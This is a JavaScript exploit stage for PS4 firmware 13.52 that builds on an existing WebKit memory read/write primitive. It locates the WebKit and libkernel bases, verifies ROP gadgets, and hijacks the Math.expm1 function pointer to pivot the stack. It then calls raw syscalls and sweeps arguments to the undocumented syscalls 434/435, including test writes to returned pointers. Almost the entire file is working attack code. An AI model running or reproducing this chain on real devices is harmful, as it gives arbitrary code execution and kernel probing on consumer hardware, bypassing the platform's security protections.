// chain_s434.js -- sc#434/435 deep probe for PS4 FW 13.52
// Self-contained: only probes sc#434/435, no Poopsploit chain.
// Usage: http://<ps4_ip>:8084/src/chain_s434.js?probe=s434deep
import { establishPrimitive } from "./core.js";
import { installWindowP, pairStatus } from "./mem.js";
import { int64 } from "./int64.js";
import { offsetsFor } from "./ps4_offsets.js";

const outEl = document.getElementById("out");
const stateEl = document.getElementById("state");
const lines = [];
let passCount = 0, failCount = 0;
const params = new URLSearchParams(location.search);

function post(tag, detail) {
    try {
        const x = new XMLHttpRequest();
        x.open("GET", "log?m=" + encodeURIComponent("[" + tag + "] "
            + String(detail == null ? "" : detail)), true);
        x.send();
    } catch (e) { }
}

function mark(tag, detail) {
    const raw = detail;
    lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));
    const esc = t => String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;");
    outEl.innerHTML = lines.map(function (l) {
        l = esc(l);
        const c = /FAIL|ERROR|THREW|REBOOT|MISS|LOST|POISON|TIMEOUT|MISMATCH|ABORTED/i.test(l) ? "bad"
                : /WARN|SKIP|REFUSED|COMMITTED|DIRTY/i.test(l) ? "warn"
                : /\bOK\b|PASS|ACHIEVED|RUNNING|ARMED/i.test(l) ? "ok" : "";
        return c ? '<span class="' + c + '">' + l + "</span>" : l;
    }).join("\n");
    outEl.scrollTop = outEl.scrollHeight;
    post(tag, raw);
}

function state(t, c) { stateEl.textContent = t; stateEl.className = c || ""; }
function check(name, ok, detail) {
    if (ok) { passCount++; mark("PROOF-OK", name + (detail ? "  " + detail : "")); }
    else { failCount++; mark("PROOF-FAIL", name + (detail ? "  " + detail : "")); }
    return ok;
}

const SYS = { read: 3, write: 4, close: 6, getpid: 20, getuid: 24, setuid: 0x17,
              open: 5, ioctl: 0x36, mmap: 0x1dd, sysctl: 0xca };

const keepAlive = [];

(async function main() {
    console.log("[s434] chain starting...");
    try {
        state("establishing primitive...", "warn");
        console.log("[s434] calling establishPrimitive...");
        const carrier = await establishPrimitive();
        console.log("[s434] primitive established, installing window.p...");
        installWindowP(carrier, { promote: params.get("promote") !== "0" });
        console.log("[s434] window.p installed");
        mark("PRIMITIVE-OK", "");

        // ---- 13.52 webkit + libkernel base measurement ----
        const TEXT_MAGIC = [0xe5894855, 0x56415741, 0x54415541, 0x8d485053];
        const textMagicAt = a => {
            const q0 = p.read8(a), q1 = p.read8(a.add32(8));
            return q0.low === TEXT_MAGIC[0] && q0.hi === TEXT_MAGIC[1]
                && q1.low === TEXT_MAGIC[2] && q1.hi === TEXT_MAGIC[3];
        };
        const cell = p.leakval(Math.expm1);
        const off = offsetsFor(navigator.userAgent);
        const nativeFn = p.read8(p.read8(cell.add32(0x18))
            .add32(off.wk_JSFunction_m_function));
        const seedBase = nativeFn.sub32(off.wk_expm1_builtin);
        let webkitBase = seedBase;
        if (textMagicAt(seedBase)) {
            mark("WEBKIT-BASE", "seed confirmed " + webkitBase);
        } else {
            for (let o = 0; o <= 0x2800000; o += 0x4000) {
                const at = new int64((nativeFn.low & ~0x3fff) - o, nativeFn.hi);
                if (at.hi < 0) break;
                if (textMagicAt(at)) { webkitBase = at; break; }
            }
            mark("WEBKIT-BASE", "walked to " + webkitBase);
        }
        const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
        let libkernelBase = errorFn.sub32(off.k__error);
        const epage = new int64(errorFn.low & ~0x3fff, errorFn.hi);
        for (let o = 0; o <= 0x80000; o += 0x4000) {
            const at = epage.sub32(o);
            if (textMagicAt(at)) { libkernelBase = at; break; }
        }
        mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
        check("bases-aligned",
            (webkitBase.low & 0x3fff) === 0 && (libkernelBase.low & 0x3fff) === 0);

        // ---- ROP gadgets ----
        const G = {};
        const GADGETS = [
            ["POP_RDI_RET", off.wk_POP_RDI_RET, [0x5f, 0xc3]],
            ["POP_RSI_RET", off.wk_POP_RSI_RET, [0x5e, 0xc3]],
            ["POP_RDX_RET", off.wk_POP_RDX_RET, [0x5a, 0xc3]],
            ["POP_RCX_RET", off.wk_POP_RCX_RET, [0x59, 0xc3]],
            ["POP_R8_RET", off.wk_POP_R8_RET, [null, 0x58, 0xc3]],
            ["POP_R9_RET", off.wk_POP_R9_RET, [null, 0x59, 0xc3]],
            ["POP_RAX_RET", off.wk_POP_RAX_RET, [0x58, 0xc3]],
            ["LEAVE_RET", off.wk_LEAVE_RET, [0xc9, 0xc3]],
            ["MOV_RDI_RAX_RET", off.wk_MOV_QWORD_PTR_RDI_RAX_RET, [0x48, 0x89, 0x07, 0xc3]],
            ["G0", off.wk_MOV_RDI_RSI_30_CALL, [0x48, 0x8b, 0x7e, 0x30]],
            ["G1", off.wk_POP_RAX_MOV_RAX_JMP_18, [0x58, 0x48, 0x8b, 0x07]],
            ["G2", off.wk_PUSH_RBP_MOV_RBP_RSP_10, [0x55, 0x48, 0x89, 0xe5]],
            ["G3", off.wk_MOV_RDI_RAX_8_CALL_20, [0x48, 0x8b, 0x78, 0x08]],
            ["G4", off.wk_MOV_RDX_RAX_18_CALL_10, [0x48, 0x8b, 0x50, off.pivot_view_sp]],
            ["G5", off.wk_PUSH_RDX_POP_RSP_RET, [0x52, 0x5c, 0xc3]],
        ];
        let gated = 0;
        for (const [nm, rva, pat] of GADGETS) {
            const a = webkitBase.add32(rva);
            let good = true;
            for (let i = 0; i < pat.length; ++i) {
                if (pat[i] === null) continue;
                if (p.read1(a.add32(i)) !== pat[i]) { good = false; break; }
            }
            if (good) { G[nm] = a; gated++; } else mark("GADGET-BAD", nm);
        }
        check("gadgets", gated === GADGETS.length, gated + "/" + GADGETS.length);
        const argGadget = [G.POP_RDI_RET, G.POP_RSI_RET, G.POP_RDX_RET,
                           G.POP_RCX_RET, G.POP_R8_RET, G.POP_R9_RET];

        // ---- syscall stub scanner ----
        const stubAddr = new Map();
        let seeded = 0;
        if (off.k_stubs) {
            for (const numStr in off.k_stubs) {
                const num = +numStr, o = off.k_stubs[numStr];
                const v = p.read8(libkernelBase.add32(o));
                if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) continue;
                if ((((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0) !== num) continue;
                stubAddr.set(num, libkernelBase.add32(o)); seeded++;
            }
        }
        const need = new Set(Object.keys(SYS).map(k => SYS[k])
            .filter(n => !stubAddr.has(n)));
        let scanned = 0;
        for (let o = 0; o < off.k_scan_stage1 && need.size; o += 16) {
            const v = p.read8(libkernelBase.add32(o));
            if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) continue;
            const num = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
            if (!need.has(num)) continue;
            stubAddr.set(num, libkernelBase.add32(o)); need.delete(num); scanned++;
        }
        mark("STUBS", "seeded=" + seeded + " scanned=" + scanned);

        // Also scan for sc#434/435 specifically (may not be in off.k_stubs)
        const SC434 = 434, SC435 = 435;
        for (let o = 0; o < off.k_scan_stage1; o += 16) {
            const v = p.read8(libkernelBase.add32(o));
            if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) continue;
            const num = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
            if (num === SC434 || num === SC435) {
                if (!stubAddr.has(num)) {
                    stubAddr.set(num, libkernelBase.add32(o));
                    mark("STUB-FOUND", "SC#" + num + " @ " + libkernelBase.add32(o));
                }
            }
        }
        if (!check("s434-stub-found", stubAddr.has(SC434), "")) return;
        mark("S434-STUB", "sc#434=" + stubAddr.get(SC434) + " sc#435=" +
            (stubAddr.has(SC435) ? stubAddr.get(SC435) : "NOT-FOUND"));

        // ---- ROP context setup ----
        function bufAddr(ab) {
            const c = p.leakval(ab);
            return p.read8(p.read8(c.add32(off.wk_ArrayBuffer_m_impl))
                .add32(off.wk_ArrayBuffer_m_contents_m_data));
        }
        function put(dv, at, v) {
            if (typeof v === "number") {
                dv.setUint32(at, v >>> 0, true);
                dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
            } else {
                dv.setUint32(at, v.low >>> 0, true);
                dv.setUint32(at + 4, v.hi >>> 0, true);
            }
        }
        const PB_SIZE = Math.max(0x28, (off.pivot_view_sp + 8 + 0xf) & ~0xf);
        function makeCtx() {
            const sb = new ArrayBuffer(0x20), pb = new ArrayBuffer(PB_SIZE);
            const kb = new ArrayBuffer(0x2000), fb = new ArrayBuffer(0x40);
            keepAlive.push(sb, pb, kb, fb);
            const c = { storeDv: new DataView(sb), pivotDv: new DataView(pb),
                stackDv: new DataView(kb), frameDv: new DataView(fb),
                stackU8: new Uint8Array(kb), frameU8: new Uint8Array(fb) };
            keepAlive.push(c.storeDv, c.pivotDv, c.stackDv, c.frameDv,
                c.stackU8, c.frameU8);
            c.S = bufAddr(sb); c.P = bufAddr(pb);
            c.K = bufAddr(kb); c.F = bufAddr(fb);
            put(c.storeDv, 0x00, G.G1); put(c.storeDv, 0x08, c.P);
            put(c.storeDv, 0x10, G.G3); put(c.storeDv, 0x18, G.G2);
            put(c.pivotDv, 0x00, c.P); put(c.pivotDv, 0x10, G.G5);
            put(c.pivotDv, 0x20, G.G4);
            return c;
        }
        function layout(c, target, args) {
            c.stackU8.fill(0); c.frameU8.fill(0);
            const insts = [];
            for (let i = 0; i < args.length; ++i) {
                insts.push(argGadget[i]); insts.push(args[i]);
            }
            const targetIdx = insts.length;
            insts.push(target);
            insts.push(G.POP_RDI_RET); insts.push(c.F);
            insts.push(G.MOV_RDI_RAX_RET);
            insts.push(G.POP_RAX_RET); insts.push(new int64(0x0a, 0xfffffff7));
            insts.push(G.LEAVE_RET);
            let at = 0x2000 - 8 * insts.length;
            if (((c.K.low + at + 8 * targetIdx) & 0xf) !== 0) at -= 8;
            for (let i = 0; i < insts.length; ++i) put(c.stackDv, at + 8 * i, insts[i]);
            put(c.pivotDv, off.pivot_view_sp, c.K.add32(at));
        }
        const M = makeCtx();
        const mainMf = p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function);
        const mainOrig = p.read8(mainMf);
        const pivotObj = {};
        keepAlive.push(pivotObj);
        const pivotCell = p.leakval(pivotObj);
        p.write8(mainMf, G.G0);

        function callAddr(target, args) {
            layout(M, target, args);
            const saved = p.read8(pivotCell);
            p.write8(pivotCell, M.S);
            Math.expm1(pivotObj);
            p.write8(pivotCell, saved);
            return { lo: M.frameDv.getUint32(0, true),
                     hi: M.frameDv.getUint32(4, true),
                     i32: M.frameDv.getUint32(0, true) | 0 };
        }
        const sc = (num, ...a) => callAddr(stubAddr.get(num), a);
        function errno() {
            const r = callAddr(errorFn, []);
            const a = new int64(r.lo, r.hi);
            return (a.hi === 0 && a.low === 0) ? -1 : p.read4(a) | 0;
        }

        const pid = sc(SYS.getpid).i32;
        check("kernel-access", pid > 0, "pid=" + pid + " uid=" + sc(SYS.getuid).i32);

        // ================================================================
        //  PROBE: s434deep -- comprehensive sc#434/435 investigation
        // ================================================================
        // Default to s434deep if no probe specified
        const probe = params.get("probe") || "s434deep";
        if (probe === "s434deep") {
            const D = d => mark("S434D", d);
            const a434 = stubAddr.get(SC434);
            const a435 = stubAddr.has(SC435) ? stubAddr.get(SC435) : null;

            D("=== SECTION A: BASE INFO ===");
            D("pid=" + pid + " uid=" + sc(SYS.getuid).i32);
            D("libkernel=" + libkernelBase.hi.toString(16) + libkernelBase.low.toString(16));
            D("a434=" + a434.hi.toString(16) + a434.low.toString(16));
            if (a435) D("a435=" + a435.hi.toString(16) + a435.low.toString(16));
            else D("a435=NOT-FOUND");

            // Read the stub bytes to confirm
            let stubBytes = "";
            for (let i = 0; i < 12; i++) {
                stubBytes += p.read1(a434.add32(i)).toString(16).padStart(2, "0") + " ";
            }
            D("sc#434 stub bytes: " + stubBytes);
            D("errno before any call: " + errno());

            // === Section B: Argument Sweep ===
            D("=== SECTION B: ARGUMENT SWEEP ===");

            // B1: Basic call x5 (stability test)
            D("--- B1: Stability (5 calls with 0,0,0,0,0,0) ---");
            const basicResults = [];
            for (let i = 0; i < 5; i++) {
                const rv = callAddr(a434, [0, 0, 0, 0, 0, 0]);
                const val = (rv.hi >>> 0) * 4294967296 + (rv.lo >>> 0);
                basicResults.push(val);
                D("B1#" + i + " rv=0x" + rv.hi.toString(16) + rv.low.toString(16)
                    + " dec=" + val + " errno=" + errno());
            }
            const allSame = basicResults.every(v => v === basicResults[0]);
            D("B1 stability: " + (allSame ? "STABLE" : "UNSTABLE (varies)")
                + " values=" + JSON.stringify(basicResults));

            // B2: a0 sweep
            D("--- B2: a0 sweep ---");
            const a0_vals = [0, 1, 2, 3, 4, 5, 7, 8, 0x10, 0x20, 0x40, 0x80,
                0x100, 0x200, 0x400, 0x800, 0x1000, 0x2000, 0x4000, 0x8000,
                0x10000, 0x100000, 0x1000000, -1 >>> 0, -2 >>> 0];
            for (const v of a0_vals) {
                const rv = callAddr(a434, [v, 0, 0, 0, 0, 0]);
                D("B2 a0=0x" + (v >>> 0).toString(16) + " rv=0x"
                    + rv.hi.toString(16) + rv.low.toString(16)
                    + " errno=" + errno());
            }

            // B3: a1 sweep
            D("--- B3: a1 sweep ---");
            const a1_vals = [0, 1, 2, 4, 0x10, 0x100, 0x1000, 0x10000,
                -1 >>> 0, -2 >>> 0];
            for (const v of a1_vals) {
                const rv = callAddr(a434, [0, v, 0, 0, 0, 0]);
                D("B3 a1=0x" + (v >>> 0).toString(16) + " rv=0x"
                    + rv.hi.toString(16) + rv.low.toString(16)
                    + " errno=" + errno());
            }

            // B4: a2 sweep
            D("--- B4: a2 sweep ---");
            for (const v of [0, 1, 2, 4, 0x10, 0x100, 0x1000, -1 >>> 0]) {
                const rv = callAddr(a434, [0, 0, v, 0, 0, 0]);
                D("B4 a2=0x" + (v >>> 0).toString(16) + " rv=0x"
                    + rv.hi.toString(16) + rv.low.toString(16)
                    + " errno=" + errno());
            }

            // B5: a3 sweep
            D("--- B5: a3 sweep ---");
            for (const v of [0, 1, 2, 4, 0x10, 0x100, -1 >>> 0]) {
                const rv = callAddr(a434, [0, 0, 0, v, 0, 0]);
                D("B5 a3=0x" + (v >>> 0).toString(16) + " rv=0x"
                    + rv.hi.toString(16) + rv.low.toString(16)
                    + " errno=" + errno());
            }

            // B6: Multi-arg combinations
            D("--- B6: Multi-arg combinations ---");
            const multiArgs = [
                [1, 0, 0, 0, 0, 0], [0, 1, 0, 0, 0, 0], [0, 0, 1, 0, 0, 0],
                [0, 0, 0, 1, 0, 0], [1, 1, 0, 0, 0, 0], [1, 0, 1, 0, 0, 0],
                [0, 1, 1, 0, 0, 0], [1, 1, 1, 0, 0, 0], [1, 1, 1, 1, 0, 0],
                [1, 1, 1, 1, 1, 0], [1, 1, 1, 1, 1, 1],
                [0x1000, 0x200, 0, 0, 0, 0], [0x100, 0x100, 0, 0, 0, 0],
            ];
            for (const args of multiArgs) {
                const rv = callAddr(a434, args);
                D("B6 args=[" + args.map(a => "0x" + (a >>> 0).toString(16)).join(",")
                    + "] rv=0x" + rv.hi.toString(16) + rv.low.toString(16)
                    + " errno=" + errno());
            }

            // B7: Negative / special values
            D("--- B7: Negative/special values ---");
            const specialArgs = [
                [-1, -1, -1, -1, -1, -1],
                [0xFFFFFFFF, 0, 0, 0, 0, 0],
                [0x80000000, 0, 0, 0, 0, 0],
                [0x7FFFFFFF, 0, 0, 0, 0, 0],
                [0, 0xFFFFFFFF, 0, 0, 0, 0],
                [0, 0, 0, 0, 0, 0xFFFFFFFF],
            ];
            for (const args of specialArgs) {
                const rv = callAddr(a434, args);
                D("B7 args=[" + args.map(a => "0x" + (a >>> 0).toString(16)).join(",")
                    + "] rv=0x" + rv.hi.toString(16) + rv.low.toString(16)
                    + " errno=" + errno());
            }

            // === Section C: Pointer Analysis ===
            D("=== SECTION C: POINTER ANALYSIS ===");
            const rv0 = callAddr(a434, [0, 0, 0, 0, 0, 0]);
            const ptrVal = (rv0.hi >>> 0) * 4294967296 + (rv0.lo >>> 0);
            const libkVal = (libkernelBase.hi >>> 0) * 4294967296 + (libkernelBase.low >>> 0);

            D("C1 rv_as_uint64=" + ptrVal);
            D("C2 rv < libkernelBase? " + (ptrVal < libkVal));
            D("C3 rv > 0x100000? " + (ptrVal > 0x100000));
            D("C3b rv == 0? " + (ptrVal === 0));
            D("C3c rv == -1 (0xFFFFFFFFFFFFFFFF)? " + (ptrVal === 0xFFFFFFFFFFFFFFFF));

            // Classify the pointer
            if (ptrVal === 0) {
                D("C4 CLASSIFICATION: ZERO (not a pointer)");
            } else if (ptrVal < 0x100000) {
                D("C4 CLASSIFICATION: SMALL INTEGER (not a pointer)");
            } else if (ptrVal < 0x100000000) {
                D("C4 CLASSIFICATION: 32-BIT POINTER (unusual)");
            } else if (rv0.hi > 0 && rv0.hi < 0x80000000) {
                D("C4 CLASSIFICATION: KERNEL-SPACE POINTER (hi=0x" + rv0.hi.toString(16) + ")");
            } else if (rv0.hi === 0) {
                D("C4 CLASSIFICATION: USERLAND 64-BIT (lo only)");
            } else {
                D("C4 CLASSIFICATION: UNKNOWN (hi=0x" + rv0.hi.toString(16)
                    + " lo=0x" + rv0.lo.toString(16) + ")");
            }

            // Read qwords at returned pointer (if it looks like a pointer)
            if (ptrVal > 0x1000 && ptrVal !== 0xFFFFFFFFFFFFFFFF) {
                D("--- C5: Reading at returned pointer ---");
                const ptr = new int64(rv0.lo, rv0.hi);
                for (let o = 0; o < 0x40; o += 8) {
                    try {
                        const w = p.read8(ptr.add32(o));
                        D("C5 +0x" + o.toString(16) + " = 0x"
                            + w.hi.toString(16) + w.low.toString(16));
                    } catch (e) {
                        D("C5 +0x" + o.toString(16) + " = CRASH (" + e.message + ")");
                        break;
                    }
                }

                // Follow pointers at common offsets
                D("--- C6: Following pointers ---");
                for (const off2 of [0, 8, 16, 24, 32, 40, 48, 56]) {
                    try {
                        const w = p.read8(ptr.add32(off2));
                        const wVal = (w.hi >>> 0) * 4294967296 + (w.lo >>> 0);
                        if (wVal > 0x10000 && wVal < 0x800000000000) {
                            D("C6 ptr@+" + off2 + "=0x" + w.hi.toString(16)
                                + w.low.toString(16) + " (looks like ptr)");
                            // Try reading one level deep
                            try {
                                const w2 = p.read8(w);
                                D("C6   -> 0x" + w2.hi.toString(16)
                                    + w2.low.toString(16));
                            } catch (e2) {
                                D("C6   -> CRASH");
                            }
                        }
                    } catch (e) { break; }
                }
            }

            // === Section D: Write Test ===
            D("=== SECTION D: WRITE TEST ===");
            if (ptrVal > 0x1000 && ptrVal !== 0xFFFFFFFFFFFFFFFF) {
                const ptr = new int64(rv0.lo, rv0.hi);
                try {
                    const orig = p.read1(ptr);
                    p.write1(ptr, 0x41);
                    const after = p.read1(ptr);
                    D("D1 write_byte: orig=0x" + orig.toString(16)
                        + " after=0x" + after.toString(16)
                        + (after === 0x41 ? " SUCCESS" : " MISMATCH"));
                    p.write1(ptr, orig); // restore
                } catch (e) {
                    D("D1 write_byte: CRASH (" + e.message + ")");
                }

                try {
                    const orig = p.read4(ptr);
                    p.write4(ptr, 0x41414141);
                    const after = p.read4(ptr);
                    D("D2 write_dword: orig=0x" + orig.toString(16)
                        + " after=0x" + after.toString(16)
                        + (after === 0x41414141 ? " SUCCESS" : " MISMATCH"));
                    p.write4(ptr, orig); // restore
                } catch (e) {
                    D("D2 write_dword: CRASH (" + e.message + ")");
                }
            } else {
                D("D-SKIP: rv is not a readable pointer");
            }

            // === Section E: sc#435 Careful Probe ===
            D("=== SECTION E: sc#435 PROBE ===");
            if (!a435) {
                D("E-SKIP: sc#435 stub not found");
            } else {
                const SC435_TIMEOUT = 3000; // 3 seconds
                const test435 = (args, label) => {
                    let completed = false;
                    const timer = setTimeout(() => {
                        if (!completed) {
                            D("E " + label + " HANG (3s timeout)");
                        }
                    }, SC435_TIMEOUT);
                    try {
                        const rv = callAddr(a435, args);
                        completed = true;
                        clearTimeout(timer);
                        D("E " + label + " rv=0x" + rv.hi.toString(16)
                            + rv.low.toString(16) + " i32=" + rv.i32
                            + " errno=" + errno());
                    } catch (e) {
                        completed = true;
                        clearTimeout(timer);
                        D("E " + label + " EXCEPTION: " + e.message);
                    }
                };

                D("--- E1-E7: sc#435 argument sweep (3s timeout each) ---");
                // Wait between tests to allow recovery
                const delay = ms => new Promise(r => setTimeout(r, ms));

                test435([0, 0, 0, 0, 0, 0], "E1 a=(0,0,0,0,0,0)");
                await delay(3500);
                test435([1, 0, 0, 0, 0, 0], "E2 a=(1,0,0,0,0,0)");
                await delay(3500);
                test435([0, 1, 0, 0, 0, 0], "E3 a=(0,1,0,0,0,0)");
                await delay(3500);
                test435([0, 0, 1, 0, 0, 0], "E4 a=(0,0,1,0,0,0)");
                await delay(3500);
                test435([-1 >>> 0, 0, 0, 0, 0, 0], "E5 a=(0xFFFFFFFF,0,0,0,0,0)");
                await delay(3500);
                test435([0, 0, 0, 1, 0, 0], "E6 a=(0,0,0,1,0,0)");
                await delay(3500);

                // Test with pointer-sized args
                D("--- E8-E10: sc#435 with pointer args ---");
                const testPtr = sc(SYS.getpid); // known good pointer-like value
                test435([testPtr.lo, testPtr.hi, 0, 0, 0, 0],
                    "E8 a=(pid_ptr,0,0,0,0,0)");
                await delay(3500);
                test435([0, 0, testPtr.lo, testPtr.hi, 0, 0],
                    "E9 a=(0,0,pid_ptr,0,0,0)");
                await delay(3500);
                test435([0, 0, 0, 0, testPtr.lo, testPtr.hi],
                    "E10 a=(0,0,0,0,pid_ptr,0)");
                await delay(3500);
            }

            // === Section F: Errno Analysis ===
            D("=== SECTION F: ERRNO ANALYSIS ===");
            // Reset errno
            sc(SYS.getpid);
            const e0 = errno();
            D("F0 errno after getpid: " + e0);

            const rv434 = callAddr(a434, [0, 0, 0, 0, 0, 0]);
            D("F1 errno after sc#434(0,0,0,0,0,0): " + errno());

            callAddr(a434, [1, 0, 0, 0, 0, 0]);
            D("F2 errno after sc#434(1,0,0,0,0,0): " + errno());

            callAddr(a434, [-1 >>> 0, 0, 0, 0, 0, 0]);
            D("F3 errno after sc#434(0xFFFFFFFF,0,0,0,0,0): " + errno());

            callAddr(a434, [0, -1 >>> 0, 0, 0, 0, 0]);
            D("F4 errno after sc#434(0,0xFFFFFFFF,0,0,0,0): " + errno());

            // === Section G: Cross-reference ===
            D("=== SECTION G: CROSS-REFERENCE ===");
            // G1: sc#434 before/after getpid
            const rv_before = callAddr(a434, [0, 0, 0, 0, 0, 0]);
            sc(SYS.getpid);
            const rv_after = callAddr(a434, [0, 0, 0, 0, 0, 0]);
            D("G1 before_pid=0x" + rv_before.hi.toString(16) + rv_before.low.toString(16)
                + " after_pid=0x" + rv_after.hi.toString(16) + rv_after.low.toString(16)
                + " same=" + (rv_before.lo === rv_after.lo && rv_before.hi === rv_after.hi));

            // G2: sc#434 with different a0 values, check if rv changes predictably
            D("--- G2: a0 dependency map ---");
            const depMap = [];
            for (let a0 = 0; a0 <= 20; a0++) {
                const rv = callAddr(a434, [a0, 0, 0, 0, 0, 0]);
                depMap.push({ a0, rv: rv.hi.toString(16) + rv.low.toString(16) });
                D("G2 a0=" + a0 + " rv=0x" + rv.hi.toString(16) + rv.low.toString(16));
            }

            // G3: Does changing a1 change the result?
            D("--- G3: a1 dependency ---");
            for (let a1 = 0; a1 <= 10; a1++) {
                const rv = callAddr(a434, [0, a1, 0, 0, 0, 0]);
                D("G3 a1=" + a1 + " rv=0x" + rv.hi.toString(16) + rv.low.toString(16));
            }

            // G4: Does changing a2 change the result?
            D("--- G4: a2 dependency ---");
            for (let a2 = 0; a2 <= 10; a2++) {
                const rv = callAddr(a434, [0, 0, a2, 0, 0, 0]);
                D("G4 a2=" + a2 + " rv=0x" + rv.hi.toString(16) + rv.low.toString(16));
            }

            // === Final Summary ===
            D("=== SUMMARY ===");
            D("sc#434 basic rv=0x" + basicResults[0].toString(16));
            D("sc#434 stability: " + (allSame ? "STABLE" : "UNSTABLE"));
            D("sc#434 pointer classification: " +
                (ptrVal === 0 ? "ZERO" :
                 ptrVal < 0x100000 ? "SMALL-INT" :
                 rv0.hi > 0 ? "KERNEL-PTR" : "USERLAND"));
            D("sc#435 found: " + (a435 ? "YES" : "NO"));
            D("total tests: pass=" + passCount + " fail=" + failCount);

            // Restore original function pointer
            p.write8(mainMf, mainOrig);
            mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
            return;
        }

        // No probe matched
        mark("USAGE", "Unknown probe: " + probe);
        p.write8(mainMf, mainOrig);

    } catch (e) {
        mark("FATAL", e.message + "\n" + e.stack);
    }
})();

